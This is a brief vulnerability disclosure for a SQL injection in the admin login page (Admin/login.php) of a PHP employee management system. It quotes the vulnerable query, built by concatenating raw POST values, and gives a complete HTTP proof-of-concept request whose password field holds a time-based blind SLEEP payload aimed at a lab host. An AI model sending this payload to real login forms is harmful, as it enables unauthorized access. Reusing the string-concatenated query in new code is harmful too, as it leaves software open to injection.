### Vulnerability file address

`Admin/login.php` from line 8,The `$password` parameter is controllable and the `$password` is not protected from sql injection, line 10 `$sql = "SELECT * FROM users WHERE username='".$username."' and password = '".$password."'";` ,line 11 `$result = mysqli_query($conn,$sql);`,line 11 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php');

if(isset($_POST['btnlogin']))
{

$username = $_POST['txtusername'];
$password = $_POST['txtpassword'];

$sql = "SELECT * FROM users WHERE username='".$username."' and password = '".$password."'";
$result = mysqli_query($conn,$sql);
$row  = mysqli_fetch_array($result);

 $_SESSION["admin-username"] = $row['username'];

 $count=mysqli_num_rows($result);
```

### POC

```http
POST /CMS/php/employee_akpoly/Admin/login.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Admin/login.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

txtusername=1&txtpassword=1' AND (SELECT 1860 FROM (SELECT(SLEEP(5)))MFue)-- mLTN&btnlogin=
```

### Attack results pictures

![image-20250128224756816](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282247855.png)
